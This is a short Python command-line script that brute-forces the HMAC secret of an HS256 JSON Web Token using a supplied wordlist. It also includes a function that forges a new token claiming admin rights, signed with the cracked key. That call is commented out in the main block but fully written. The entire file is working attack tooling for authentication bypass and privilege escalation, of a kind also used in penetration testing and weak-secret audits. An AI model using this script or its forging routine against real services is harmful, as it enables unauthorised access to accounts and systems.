#! /usr/bin/env python3

import hmac, hashlib, base64, sys

# Get wordlist linecount
linecount = len(open(sys.argv[2], "rb").readlines())

# Separate header/payload/signature
def jwtParser(jwt=sys.argv[1]):
    jwt_list = jwt.encode().split(b".")
    return jwt_list[0], jwt_list[1], jwt_list[2]

# Decode header/payload
def jwtInfo():
    header, payload, sig = jwtParser()
    while True:
        try:
            header = base64.urlsafe_b64decode(header).decode('utf-8')
            break
        except:
            header += b"="
    while True:
        try:
            payload = base64.urlsafe_b64decode(payload).decode('utf-8')
            break
        except:
            payload += b"="
    return header, payload

# Check for HS256
def algCheck():
    if "HS256" in jwtInfo()[0]:
        return True
    else:
        return False

# Brute-force JWT key
def jwtCrack():
    if algCheck() == False:
        print("Only JWTs using HS256 are supported at this time.")
    else:
        with open(sys.argv[2], "rb") as f:
            wordlist = f.readlines()
        header, payload, valid_sig = jwtParser()
        msg = header + b"." + payload
        count = 0
        found = False
        for word in wordlist:
            count += 1
            print("Searching for valid key: %s / %s" % (count, linecount), end='\r')
            key = word.rstrip(b"\n")
            hm = hmac.new(key, msg, hashlib.sha256).digest()
            ehm = base64.urlsafe_b64encode(hm).rstrip(b'=')
            if ehm == valid_sig: 
                found = True
                valid_key = key.decode('utf-8')
                print("\n" + "Secret Found: ", valid_key)
                break
        if found == False:
            print("\n" + "No secret was discovered.")
            return False
        else:
            return valid_key

# Forge new JWT with discovered key
def jwtForge(key):
    key = key.encode()
    h = str('{"typ":"JWT","alg":"HS256"}')
    p = str('{"iat":90000000,"name":"Jason","admin":true}')
    eh = base64.b64encode(h.encode()).rstrip(b"=")
    ep = base64.b64encode(p.encode()).rstrip(b"=")
    msg = eh + b"." + ep
    hm = hmac.new(key, msg, hashlib.sha256).digest()
    hm64 = base64.urlsafe_b64encode(hm).rstrip(b"=")
    jwt = msg + b"." + hm64
    return jwt.decode()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: %s <jwt> <wordlist>" % sys.argv[0])
    else:
        h, p = jwtInfo()
        print("Header:\n" + h + "\n\nPayload:\n" + p + "\n")
        jwtCrack()
        #vkey = jwtCrack()
        #if vkey != False:
        #   print(jwtForge(vkey))
        
